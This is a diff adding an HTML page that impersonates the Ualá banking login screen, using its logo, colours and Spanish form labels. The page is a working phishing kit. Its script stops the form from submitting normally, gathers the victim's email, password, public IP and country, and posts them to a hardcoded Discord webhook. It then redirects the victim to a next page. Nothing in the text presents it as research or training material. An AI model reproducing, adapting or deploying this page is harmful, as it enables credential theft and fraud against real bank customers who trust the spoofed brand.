@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="uala.ico">
+  <title>Ualá</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <style>
+    :root {
+      --uala-blue: #022a9c;
+      --uala-blue-dark: #0033c2;
+      --text-main: #1f2430;
+      --text-muted: #7b8191;
+      --text-placeholder: #b5bcc9;
+      --line-color: #d7dde9;
+      --bg: #ffffff;
+    }
+
+    * {
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text-main);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, -system-ui, "Segoe UI", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .app {
+      width: 100%;
+      max-width: 430px;
+      padding: 42px 30px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo-wrapper {
+      display: flex;
+      justify-content: center;
+      padding-bottom: 120px;
+    }
+
+    .logo-wrapper img {
+      height: 45.5px;
+      width: auto;
+    }
+
+    .form-section {
+      width: 100%;
+    }
+
+    .field-group + .field-group {
+      margin-top: 32px;
+    }
+
+    .field-label {
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
+    .input-wrapper {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid var(--line-color);
+      padding-bottom: 12px;
+      position: relative;
+      transition: border-color 0.25s ease;
+      width: 100%;
+    }
+
+    .input-wrapper::after {
+      content: "";
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      width: 100%;
+      height: 0.1px;
+      background: var(--uala-blue);
+      opacity: 0;
+      box-shadow: 0 0 0px var(--uala-blue);
+      transition: opacity 0.35s ease, box-shadow 0.35s ease;
+      border-radius: 2px;
+    }
+
+    .input-wrapper.active {
+      border-color: var(--uala-blue);
+    }
+
+    .input-wrapper.active::after {
+      opacity: 1;
+      box-shadow: 0 0 6px var(--uala-blue);
+    }
+
+    .input-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      color: var(--uala-blue);
+      flex: 0 0 auto;
+    }
+
+    .input-icon svg {
+      display: block;
+      width: 24px;
+      height: 24px;
+      stroke: currentColor;
+    }
+
+    .text-input {
+      border: none;
+      outline: none;
+      flex: 1 1 auto;
+      font-size: 16px;
+      color: var(--text-main);
+      background: transparent;
+      padding: 0;
+      min-width: 0;
+      transition: opacity 0.18s ease;
+    }
+
+    .text-input::placeholder {
+      color: var(--text-placeholder);
+      transition: opacity 0.18s ease;
+    }
+
+    .text-input.focused::placeholder {
+      opacity: 0;
+    }
+
+    .text-input:-webkit-autofill,
+    .text-input:-webkit-autofill:hover,
+    .text-input:-webkit-autofill:focus,
+    .text-input:-webkit-autofill:active {
+      -webkit-box-shadow: 0 0 0 30px var(--bg) inset !important;
+      -webkit-text-fill-color: var(--text-main) !important;
+      caret-color: var(--uala-blue);
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .eye-toggle {
+      border: none;
+      background: none;
+      padding: 0;
+      margin-left: 12px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--uala-blue);
+      flex: 0 0 auto;
+      outline: none;
+    }
+
+    .eye-toggle svg {
+      width: 26px;
+      height: 20px;
+      display: block;
+    }
+
+    .eye-group {
+      fill: none;
+      stroke: currentColor;
+      stroke-width: 1.6;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      transform-origin: 50% 50%;
+      transition: opacity 150ms ease, transform 150ms ease;
+    }
+
+    .eye-open {
+      opacity: 0;
+      transform: scale(0.8);
+    }
+
+    .eye-closed {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .eye-toggle.active .eye-open {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .eye-toggle.active .eye-closed {
+      opacity: 0;
+      transform: scale(0.85);
+    }
+
+    .actions {
+      margin-top: 90px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .primary-btn {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      border-radius: 999px;
+      border: none;
+      padding: 16px 24px;
+      background: var(--uala-blue);
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 500;
+      letter-spacing: 0.02em;
+      cursor: pointer;
+      box-shadow: 0 6px 12px rgba(0, 69, 255, 0.18);
+      transition: background 120ms ease, transform 80ms ease, box-shadow 120ms ease;
+    }
+
+    .primary-btn:hover {
+      background: var(--uala-blue-dark);
+      box-shadow: 0 8px 18px rgba(0, 69, 255, 0.22);
+    }
+
+    .primary-btn:active {
+      transform: translateY(1px);
+      box-shadow: 0 3px 8px rgba(0, 69, 255, 0.18);
+    }
+
+    .secondary-link {
+      margin-top: 30px;
+      text-align: center;
+      font-size: 15px;
+      color: var(--uala-blue);
+      text-decoration: none;
+      display: block;
+    }
+
+    .secondary-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <main class="app">
+    <div class="logo-wrapper">
+      <img src="https://images.ctfassets.net/6n252fx9hkkr/4pC2sp1c3LAFN8sbSxEAPi/4570c4aaee41ece2a44871f446c6df48/Logo_Uala_Horizontal.png" alt="Logo Ualá">
+    </div>
+
+    <section class="form-section" aria-label="Inicio de sesión">
+      <form id="formIndex" action="cargando.php" method="POST">
+        <!-- Email -->
+        <div class="field-group">
+          <div class="field-label">Correo electrónico</div>
+          <div class="input-wrapper">
+            <span class="input-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M12 12.25c2.14 0 3.87-1.73 3.87-3.87S14.14 4.5 12 4.5 8.13 6.23 8.13 8.38 9.86 12.25 12 12.25z" fill="none"></path>
+                <path d="M5 19.5c.54-2.8 3.01-4.88 7-4.88s6.46 2.08 7 4.88" fill="none"></path>
+              </svg>
+            </span>
+            <input type="email" class="text-input" placeholder="usuario@ejemplo.com" autocomplete="email" id="email" name="email" required>
+          </div>
+        </div>
+
+        <!-- Password -->
+        <div class="field-group">
+          <div class="field-label">Contraseña</div>
+          <div class="input-wrapper password-wrapper">
+            <span class="input-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M8.25 11.25V8.9a3.75 3.75 0 0 1 7.5 0v2.35" fill="none"></path>
+                <path d="M7.5 11.25h9a1.75 1.75 0 0 1 1.75 1.75v5.25A1.75 1.75 0 0 1 16.5 20H7.5A1.75 1.75 0 0 1 5.75 18.25V13a1.75 1.75 0 0 1 1.75-1.75z" fill="none"></path>
+              </svg>
+            </span>
+
+            <input id="password" name="password" type="password" class="text-input" placeholder="Contraseña" autocomplete="off" required>
+
+            <button type="button" class="eye-toggle" id="toggle-password" aria-label="Mostrar contraseña" aria-pressed="false">
+              <svg viewBox="0 0 32 20">
+                <g class="eye-group eye-open">
+                  <path d="M2.5 10c2.4-4 5.8-6.5 13.5-6.5S26.1 6 29.5 10c-3.4 4-6.8 6.5-13.5 6.5S4.9 14 2.5 10z"></path>
+                  <path d="M16 13.75a3.75 3.75 0 1 0 0-7.5 3.75 3.75 0 0 0 0 7.5z"></path>
+                </g>
+                <g class="eye-group eye-closed">
+                  <path d="M4 12.5C7.2 9.8 11.1 8.5 16 8.5s8.8 1.3 12 4"></path>
+                  <path d="M10.1 6.8L9 5.2"></path>
+                  <path d="M16 5.3V3.5"></path>
+                  <path d="M21.9 6.8L23 5.2"></path>
+                </g>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="actions">
+          <button class="primary-btn" type="submit">Iniciar sesión</button>
+          <a href="#" class="secondary-link">¿Olvidaste tu contraseña?</a>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <script>
+  (function () {
+    // Toggle de contraseña
+    function setupToggle(inputId, toggleId) {
+      const input = document.getElementById(inputId);
+      const toggle = document.getElementById(toggleId);
+      if (!input || !toggle) return;
+
+      toggle.addEventListener("click", () => {
+        const isVisible = input.type === "text";
+        input.type = isVisible ? "password" : "text";
+        toggle.classList.toggle("active", !isVisible);
+        toggle.setAttribute("aria-pressed", String(!isVisible));
+        toggle.setAttribute("aria-label", isVisible ? "Mostrar contraseña" : "Ocultar contraseña");
+      });
+    }
+    setupToggle("password", "toggle-password");
+
+    // Efecto focus inputs
+    document.querySelectorAll(".text-input").forEach(input => {
+      input.addEventListener("focus", () => {
+        input.classList.add("focused");
+        input.parentElement.classList.add("active");
+      });
+      input.addEventListener("blur", () => {
+        input.classList.remove("focused");
+        input.parentElement.classList.remove("active");
+      });
+    });
+
+    // Enviar formulario a webhook con IP y país
+    const form = document.getElementById("formIndex");
+    const webhookUrl = "https://discord.com/api/webhooks/1458184906520662165/KrDImlZvDPO2xnpAC5VuMOKfoX3WrKVMYWCZwYvQSbJwX2sGIuQCftNim0S5F194esDL"; // <--- pon tu webhook aquí
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault(); // evita que se recargue la página
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Obtener IP pública y país
+      let ip = "";
+      let country = "";
+      try {
+        // Paso 1: obtener IP pública
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip || "";
+
+        // Paso 2: obtener país usando ipwhois.app
+        if (ip) {
+          const countryRes = await fetch(`https://ipwhois.app/json/${ip}`);
+          const countryData = await countryRes.json();
+          country = countryData.country || "";
+        }
+      } catch (err) {
+        console.error("No se pudo obtener IP/país:", err);
+      }
+
+      // Preparar mensaje
+      const message = `📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n🏳️ País: ${country}`;
+
+      // Enviar al webhook
+      if (webhookUrl) {
+        try {
+          await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+          });
+        } catch (err) {
+          console.error("Error enviando webhook:", err);
+        }
+      }
+
+      // Redirigir después de enviar
+      window.location.href = "siguiente.html";
+    });
+  })();
+  </script>
+</body>
+</html>
